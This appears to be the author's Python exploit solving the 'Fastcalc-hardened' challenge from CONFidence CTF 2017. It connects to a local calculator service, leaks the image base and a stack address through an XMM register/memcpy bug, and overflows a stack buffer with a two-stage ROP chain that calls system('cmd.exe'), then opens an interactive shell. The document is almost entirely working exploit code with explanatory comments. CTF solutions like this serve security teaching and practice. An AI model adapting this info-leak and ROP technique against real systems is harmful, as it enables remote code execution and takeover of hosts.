#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Fastcalc-hardened
# Competition:      CONFidence CTF 2017
# Category:         Software exploitation
# Scoring:          500 pts (hard)
# Number of solves: 3 out of 22 teams

import sys
import struct
import socket
import telnetlib
import time

def read_until(s, text):
  buffer = ""
  while len(buffer) < len(text):
    buffer += s.recv(1)
  while buffer[-len(text):] != text:
    buffer += s.recv(1)
  return buffer[:-len(text)]

def new_expr(s, expression):
  read_until(s, "Operation: ")
  s.sendall("new\n")
  read_until(s, "Enter the expression: ")
  s.sendall("%s\n" % expression)

def run(s):
  read_until(s, "Operation: ")
  s.sendall("run\n")

def quit(s):
  read_until(s, "Operation: ")
  s.sendall("quit\n")

def main():
  # Try to leak the image base address through the XMM/memcpy bug.
  IMAGE_BASE = None
  while IMAGE_BASE == None:
    s = socket.socket()
    s.connect(("127.0.0.1", 4141))

    # Create an expression of 106 + signs. Executing the first 100 will result in
    # fiber preemption. When the last 6 are executed, they will move the XMM6
    # value down to XMM0, which is supposed to be the result of the expression.
    #
    # At that moment, XMM0-XMM5 are all 0, and 25% of times, XMM6 contains
    # leftover data from the previous memcpy() execution (called while creating
    # the other expression).
    new_expr(s, "+" * 106)

    # Execute the first 100 items in expression #1, in order to preempt the fiber.
    run(s)

    # Create expression #2 in order to trigger a memcpy() call which will leak the
    # image base address via XMM6. The "256" value was chosen specifically such
    # that XMM6 overlaps with a valid program address that can be disclosed.
    new_expr(s, "+" * 256)

    # Run calculations again, so that #1 will execute and complete by potentially
    # leaking the XMM6 value. Use the upper 32-bit to test if the leak was
    # successful and if so, save the program image base.
    run(s)
    read_until(s, "result: ")
    result = float(read_until(s, "\n"))
    leaked_address = struct.unpack("<Q", struct.pack("<d", result))[0] >> 32

    LEAKED_OFFSETS = [0x4b25]

    for offset in LEAKED_OFFSETS:
      if ((leaked_address & 0xffff) == (offset & 0xffff)):
        IMAGE_BASE = leaked_address - offset
        break

    if IMAGE_BASE == None:
      print "[-] Leaked invalid address %x, retrying." % leaked_address

    quit(s)
    s.close()

  print "[+] Leaked image base address: %x" % IMAGE_BASE

  # Let's leak the stack address now. While the image base is the same across
  # connections, the stack is not, so as soon as we leak the address, we don't
  # disconnect, but instead carry out the rest of the exploitation (stack buffer
  # overflow) in the existing session.
  STACK_ADDRESS = None
  while STACK_ADDRESS == None:
    s = socket.socket()
    s.connect(("127.0.0.1", 4141))

    # Create an expression of 106 + signs. Executing the first 100 will result in
    # fiber preemption. When the last 6 are executed, they will move the XMM6
    # value down to XMM0, which is supposed to be the result of the expression.
    #
    # At that moment, XMM0-XMM5 are all 0, and 25% of times, XMM6 contains
    # leftover data from the previous memcpy() execution (called while creating
    # the other expression).
    new_expr(s, "+" * 106)

    # Execute the first 100 items in expression #1, in order to preempt the fiber.
    run(s)

    # Create expression #2 in order to trigger a memcpy() call which will leak a
    # stack address via XMM6. The "248" value was chosen specifically such that
    # XMM6 overlaps with a valid stack address that can be disclosed.
    new_expr(s, "+" * 248)

    # Run calculations again, so that #1 will execute and complete by potentially
    # leaking the XMM6 value. Use the upper 32-bit to test if the leak was
    # successful and if so, save the stack address and break out of the loop,
    # continuing exploitation outside of it.
    run(s)
    read_until(s, "result: ")
    result = float(read_until(s, "\n"))
    leaked_address = struct.unpack("<Q", struct.pack("<d", result))[0] >> 32

    if leaked_address != 0x2b2b2b2b and leaked_address != 0:
      STACK_ADDRESS = leaked_address - 0xF6C
      break
    else:
      print "[-] Leaked invalid address %x, retrying." % leaked_address

    quit(s)
    s.close()

  print "[+] Leaked stack address with controlled data: %x" % STACK_ADDRESS

  # Second-stage ROP, which triggers system("cmd.exe"), and is located on the
  # process stack (as the first value in the RPN array).
  retaddr = IMAGE_BASE + 0x3404   # CALL SYSTEM
  argument = IMAGE_BASE + 0x24380 # db "cmd.exe', 0
  rop_float = repr(struct.unpack("<d", struct.pack("<II", retaddr, argument))[0])

  # First-stage ROP, which pivots the stack to the second-stage ROP generated
  # above.
  ebp = STACK_ADDRESS - 4
  retaddr = IMAGE_BASE + 0x3416 # MOV ESP, EBP; POP EBP; RETN
  stack_frame_float = repr(struct.unpack("<d", struct.pack("<II", ebp, retaddr))[0])

  # Send an overly long expression, whose last "double"-type operand overwrites
  # EBP+RETADDR, eventually transfering execution to system("cmd.exe").
  new_expr(s, str(rop_float) + "+" * 258 + str(stack_frame_float))

  # Return to the overwritten address / stack frame.
  quit(s)

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
